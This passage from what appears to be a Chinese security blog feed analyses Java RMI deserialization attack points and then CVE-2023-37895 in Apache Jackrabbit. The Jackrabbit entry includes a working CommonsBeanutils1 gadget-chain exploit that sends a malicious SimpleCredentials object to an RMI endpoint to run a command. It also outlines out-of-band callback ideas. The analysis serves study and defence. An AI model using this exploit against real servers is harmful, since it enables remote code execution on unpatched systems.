    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>终于来到最后一篇了，这个RMI确实拖了我很长时间，一直没时间写，还发现有很多新的东西需要写，但是自己又没有时间，，，，后面还有类加载、Fastjson、CC、CB，，，，，，，感觉自己还有好多东西要学，大脑有点不够用了(猪脑过载)，还是慢慢积累，慢慢成长吧。噢，对了上次忘了每篇鸡汤，这次一并补上：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">路漫漫其修远兮，吾将上下而求索<br>                            ——屈原<br>千磨万击还坚韧，任尔东南西北风<br>                                ——郑板桥<br></code></pre></td></tr></table></figure><h1 id="攻击客户端："><a href="#攻击客户端：" class="headerlink" title="攻击客户端："></a>攻击客户端：</h1><h2 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h2><p><img src="https://ice.frostsky.com/2023/08/16/df88fdc4cd57d758745a70045e5a1e02.md.png" alt="img"></p><p>通过图片我们可以看到注册中心与客户端之间通信是为了获取stub。</p><p>那么我们下断点跟一下看看里面究竟藏着什么猫腻。</p><p><img src="https://ice.frostsky.com/2023/08/26/36a6f00d9e4eb752d3223dafee3b2b28.png" alt="image-20230825201413522"></p><p>直接来到RegistryImpl_Stub.<code>lookup</code>：</p><p><img src="https://ice.frostsky.com/2023/08/26/1331dd3bee5072c5ed1fd4194cb1fd88.png" alt="image-20230825202452411"></p><p>进来之后一眼看到三部分1,3部分很简单就是先将传入的字符序列化传给注册中心，最后再把注册中心返回的数据进行反序列化。</p><p>这个反序列化的点就是我们可以利用的点，假如注册中心返回一个恶意类，客户端反序列化之后会直接执行。所以这就是我们攻击客户端的<strong>第一种方法</strong>。</p><p>还有比较有意思的第2部分：</p><p><img src="https://ice.frostsky.com/2023/08/26/005b268fafa06afa159051dd334505b5.png" alt="image-20230825202810211"></p><p>可以看到它是UnicastRef.invoke(var2)具体的值也可以看到，我们再次进行跟进：</p><p><img src="https://ice.frostsky.com/2023/08/26/39abf3697a5320e58b3cc8ee1345e9a7.png" alt="image-20230825203034282"></p><p>再次跟进：</p><p><img src="https://ice.frostsky.com/2023/08/26/9934ef72761e25b6af45da084a910979.png" alt="image-20230825203409694"></p><p>可以看到这里捕获2异常，如果异常为2，则会对流进行反序列化，这里的本意可能是想通过反序列化来获取更详细的错误信息，但是这里实际上也是利用点，且这个利用点更加隐蔽、且范围更广。为什么这么说？</p><p><img src="https://ice.frostsky.com/2023/08/26/775e23f0e68790ebacaa59f221f573ae.png" alt="image-20230825203804805"></p><p>因为只要是调用的这个invoke的函数都会触发反序列化，但是在处理网络请求的时候，会大量的调用这个invoke，所以这里也更危险。</p><h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p><img src="https://ice.frostsky.com/2023/08/26/2c9149d9057e5bcbdbb5aa2e77cfad36.png" alt="image-20230826103901123"></p><p>跟进客户端调取服务端远程对象：</p><p><img src="https://ice.frostsky.com/2023/08/26/1477b782d19faf5eb67b4a2e894248bf.png" alt="image-20230826104100632"></p><p>直接来到了<code>invoke</code>方法并调用<code>invokeRemoteMethod(proxy, method, args);</code>可以很清楚的看到堆栈信息和具体传入的参数。我们再次跟进：</p><p><img src="https://ice.frostsky.com/2023/08/26/b16a1c7f349a0002f64f74ef4faa11b5.png" alt="image-20230826104547535"></p><p>可以看到这里又调用了UnicastRef.<code>invoke()</code>但是这里的<code>invoke</code>是重载过的，和我们上面的UnicastRef.<code>invoke()</code>有点不太一样，我们再次跟进：</p><p><img src="https://ice.frostsky.com/2023/08/26/3dda57d373c80b5661646a6527f33134.png" alt="image-20230826105829638"></p><p><img src="https://ice.frostsky.com/2023/08/26/61ecc78d109c92206b5634ec7971165f.png" alt="image-20230826110042875"></p><p>可以看到这里的<code>marshalValue()</code>其实是将我们输入进行序列化，通过参数信息也可以看到，这里将我们调用的远程方法<code>hello</code>也传入进去。</p><p>完了之后又调用了<code>executeCall()</code>也就是说所有客户端的请求都会调用这个<code>executeCall()</code>方法。我们再往后看：</p><p><img src="https://ice.frostsky.com/2023/08/26/32353af6f402ca4cf7ddbb7f328e7450.png" alt="image-20230826110437577"></p><p>这里会获取到服务端的返回值传入<code>unmarshalValue()</code>而在这个<code>unmarshalValue()</code>中其实是将返回值进行反序列化：</p><p><img src="https://ice.frostsky.com/2023/08/26/cd64e5434f009bee7c5efe488c65e8b8.png" alt="image-20230826110607396"></p><p>所以看到这我们也明白了，客户端与服务端之间，客户端也是有两个反序列化的点。</p><p>首先第一个，细心的同学可以看到上图我在<code>executeCall()</code>打了断点但是没跟进去，原因是因为他和之前(客户端与注册中心)的<code>executeCall()</code>是一样的。他之中也有反序列化的点：</p><p><img src="https://ice.frostsky.com/2023/08/26/c4463143ebec771dd9b8666e7387967b.png" alt="image-20230826111124434"></p><p>第二个反序列化的点就是我们分析的<code>unmarshalValue()</code>中将服务端返回值反序列化。</p><h1 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h1><h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>当客户端在请求注册中心时会来到Transport.<code>serviceCall()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/26/0be7267dd72c68390f7ea89a10b04b77.png" alt="image-20230826113208590"></p><p>可以看到这里先是获取Target，而这个Target也就是RegistryImpl_Stub，后面会获取分发器，而里面的内容就是skel。后面会调用<code>dispatch()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/26/083de88bc3740d5bd73ced9be63624d7.png" alt="image-20230826113532626"></p><p><img src="https://ice.frostsky.com/2023/08/26/d4d0a560d9bcc88264c73eda7e495756.png" alt="image-20230826113741741"></p><p>这个dispatch也就是<code>UnicastServerRef</code>我们再次进行跟进：</p><p><img src="https://ice.frostsky.com/2023/08/26/cfa9bb3800410d3cde8595168fab9cbd.png" alt="image-20230826114527833"></p><p>这里首先是获取输入，在检查skel字段是否为空，不为空则调用<code>oldDispatch()</code>，那我们再跟进：</p><p><img src="https://ice.frostsky.com/2023/08/26/437eb1fb27f674449cbd30b97fbe99a4.png" alt="image-20230826114853814"></p><p>这里也就终于走到了skel.<code>dispatch()</code>，这个<code>dispatch()</code>也就是我们上一篇讲到的那几种方法对应的case，他会对不同的方法执行不同的readObject。（因为，截不下。我贴一下，这样大家就不用回去看了）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>        String var7;<br>        ObjectInput var8;<br>        ObjectInput var9;<br>        Remote var80;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.bind&quot;</span>);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var9 = var2.getInputStream();<br>                    var7 = (String)var9.readObject();<br>                    var80 = (Remote)var9.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var77) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var77);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var7, var80);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var76) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var76);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                var2.releaseInputStream();<br>                String[] var79 = var6.list();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var81</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var81.writeObject(var79);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var75) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var75);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var8 = var2.getInputStream();<br>                    var7 = (String)var8.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var73) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var73);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var80 = var6.lookup(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var82</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var82.writeObject(var80);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var72) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var72);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.rebind&quot;</span>);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var9 = var2.getInputStream();<br>                    var7 = (String)var9.readObject();<br>                    var80 = (Remote)var9.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var70) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var70);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var7, var80);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var69) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var69);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.unbind&quot;</span>);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var8 = var2.getInputStream();<br>                    var7 = (String)var8.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var67) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var67);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var66) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var66);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h2><p>这里就不跟了，流程基本上大差不差。只不过服务端会调用bind，case的点不一样。</p><h1 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h1><h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>之后我们要确保获取到的Target是动态代理，因为这样才是服务端在处理请求。</p><p><img src="https://ice.frostsky.com/2023/08/26/f724a2cf95fefb7956f583c232d91d31.png" alt="image-20230826120329281"></p><p>也是会来到Transport.<code>serviceCall()</code>，调用<code>dispatch()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/26/8cd6cc77f66f85abe8fe4d4b85bbe963.png" alt="image-20230826115940552"></p><p>跟进：</p><p><img src="https://ice.frostsky.com/2023/08/26/f483e7ef457d6cd00fb0328c60a219cd.md.png" alt="image-20230826120750763"></p><p>我们发现之前注册中心在处理的时候，因为接收到的skel不为空所以走的是上面的if，但是服务端在处理的时候会直接走到下面。</p><p><img src="https://ice.frostsky.com/2023/08/26/bf85634377be2a60af91a108bb62f185.png" alt="image-20230826121943913"></p><p>这里会调用这个<code>unmarshalValue()</code>方法，其实这个方法就是将客户端的数据进行反序列化：</p><p><img src="https://ice.frostsky.com/2023/08/26/18afcf7110b1f6d2503ced7427d2686f.png" alt="image-20230826122123337"></p><p>最后在进行真正的调用：</p><p><img src="https://ice.frostsky.com/2023/08/26/48eef62b1e7d378be7f3ed7f49e12e81.png" alt="image-20230826122303876"></p><p>看到这利用点也就出来了，就是我们上面的readObject了。</p><h2 id="注册中心攻击服务端"><a href="#注册中心攻击服务端" class="headerlink" title="注册中心攻击服务端"></a>注册中心攻击服务端</h2><p>同样的套路，我们直接略过。。。。。</p><p>至此，我们的RMI也就草草结束了，，其实我只是很浅显的写了一下，包括他还有通过JRMP去攻击客户端、回收机制、高版本绕过、等等。我觉得先浅浅的了解一点，等后面用得着再深入的学这样是好的。然后后面的主线就是去分析一些类似于RMI的这种在java安全中有着一席之地的东西，支线的话偶尔会穿插一些漏洞分析文章。我尽量自律，保持稳定的产出速度(如果没有什么意外发生)。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>浅析Apache Jackrabbit(CVE-2023-37895)</title>
    <link href="/2023/08/24/%E6%B5%85%E6%9E%90ApacheJackrabbit/"/>
    <url>/2023/08/24/%E6%B5%85%E6%9E%90ApacheJackrabbit/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-Jackrabbit反序列化漏洞分析-CVE-2023-37895"><a href="#Apache-Jackrabbit反序列化漏洞分析-CVE-2023-37895" class="headerlink" title="Apache Jackrabbit反序列化漏洞分析(CVE-2023-37895)"></a>Apache Jackrabbit反序列化漏洞分析(CVE-2023-37895)</h1><h2 id="漏洞简述："><a href="#漏洞简述：" class="headerlink" title="漏洞简述："></a>漏洞简述：</h2><p>Apache Jackrabbit是Apache公司的一个内容存储库。</p><p>Apache Jackrabbit Webapp&#x2F;Standalone存在代码问题漏洞，该漏洞源于组件commons-beanutils存在远程代码执行（RCE）漏洞。</p><p>受影响的产品和版本：Apache Jackrabbit Webapp&#x2F;Standalone 2.20.10及之前版本，2.21.17及之前版本。</p><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>首先通过RemoteBindingServlet的<code>getRemoteRepository()</code>获取Repository对象，然后转化为Stub代理对象返回给Response。跟进<code>getRemoteRepository()</code></p><p><img src="https://ice.frostsky.com/2023/08/23/3e51c5505f738c4e142b602ec4d2bda8.png" alt="image-20230823094610422"></p><p>这里调用<code>getRemoteAdapterFactory()</code>获取<code>RemoteAdpterFactory</code>对象。默认是<code>ServerAdapterFactory()</code>然后调用ServerAdapterFactory.<code>getRemoteRepository</code>方法获取Repository对象。</p><p><img src="https://ice.frostsky.com/2023/08/23/ecfe09983ae899065f16e76dbc45075f.png" alt="image-20230823095842783"></p><p><img src="https://ice.frostsky.com/2023/08/23/02d1a71e1ecc211a0332ce19d1290c06.png" alt="image-20230823100307211"></p><p>当客户端获取到Repository对象后，可以调用Repository的<code>login</code>方法，跟进到ClientRepository的实现类：</p><p><img src="https://ice.frostsky.com/2023/08/23/a83a93ff99ef7a6e14457fd6f09f2212.png" alt="image-20230823100644700"></p><p>里面又会调另外一个<code>login()</code>(ClientRepository)：</p><p><img src="https://ice.frostsky.com/2023/08/23/18decbb0f66fe753ab4162b7be6a5772.png" alt="image-20230823100743053"></p><p>最后通过RMI讲客户端的<code>Credentials</code>类传输到服务端，其中用的是RMI底层的JRMP协议，将客户端序列化后，把序列化的数据传输到服务端在反序列化(上篇RMI中的C和S的通信过程)。如果我们传入一个恶意的<code>Credentials</code>对象，则会执行相关的恶意代码。(ServerRepository.login)：</p><p><img src="https://ice.frostsky.com/2023/08/23/e8d00852c0351e3d9472a29e0877a7a3.png" alt="image-20230823101423557"></p><p>跟进<code>Credentials</code>：</p><p><img src="https://ice.frostsky.com/2023/08/23/76d076a6218510f0cf15a7989cfbf827.png" alt="image-20230823101900193"></p><p>发现他不仅继承了<code>Serializable</code>还有很多实现类，我们跟进<code>SimpleCredentials</code>：</p><p><img src="https://ice.frostsky.com/2023/08/23/c89365752b2f6da8284d9457497ebd36.png" alt="image-20230823102102814"></p><p>发现attributes属性是Map而且可以存储任意Object类型对象。我们通过<code>setAttribute()</code>方法将构造的恶意<code>PriorityQueue</code>对象存在到这个<code>AttributesMap</code>中。</p><p>当反序列化包含恶意<code>PriorityQueue</code>的<code>SimpleCredentials</code>对象时，会递归反序列化它的所有属性，其中就包含了attributes这个Map，反序列化attributes时,也会反序列化其中存放的<code>PriorityQueue</code>对象，这样就会触发<code>PriorityQueue</code>对象中的反序列化逻辑，导致远程代码执行。</p><h2 id="POC和EXP"><a href="#POC和EXP" class="headerlink" title="POC和EXP"></a>POC和EXP</h2><p><strong>exp思路：</strong></p><p>该项目包含了Commons BeanUtils组件，可利用CB链构造恶意Credentials对象。</p><p><strong>exp_demo：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;<br><span class="hljs-keyword">import</span> javax.jcr.Repository;<br><span class="hljs-keyword">import</span> javax.jcr.SimpleCredentials;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String Name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(Name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplatesImpl(String cmd) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>            ctClass.setSuperclass(superClass);<br>            <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>            constructor.setBody(<span class="hljs-string">&quot; try &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +<br>                    <span class="hljs-string">&quot;\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot; &#125;&quot;</span>);<br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.defrost();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;&#125;;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = getTemplatesImpl(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        setFieldValue(obj,  <span class="hljs-string">&quot;_name&quot;</span>,  <span class="hljs-string">&quot;aaaa&quot;</span>);<br>        setFieldValue(obj,  <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>( <span class="hljs-literal">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; payload = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,comparator);<br>        payload.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        payload.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comparator,  <span class="hljs-string">&quot;property&quot;</span>,  <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(payload, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj,obj&#125;);<br><br>        <span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>        exp.setAttribute( <span class="hljs-string">&quot;admin111&quot;</span>,payload);<br>        <span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(<span class="hljs-string">&quot;http://localhost:8080/rmi&quot;</span>);<br>        repository.login(exp);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>复现：</p><p><img src="https://ice.frostsky.com/2023/08/23/b87ad1dd168aa8e5276dba4551382016.png" alt="image-20230823112724991"></p><p><strong>poc思路：</strong></p><p>因为Runtime的exec没有回显，那么这里有两种思路：</p><ol><li>因为用的是RMI，RMI底层是JRMP，可以利用ysoserial中JRMP让服务端回连。</li><li>因为利用链中有HashMap类型的attributes，可以利用URLDNS这条链，让服务器回连。</li></ol><p><strong>poc_demo：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 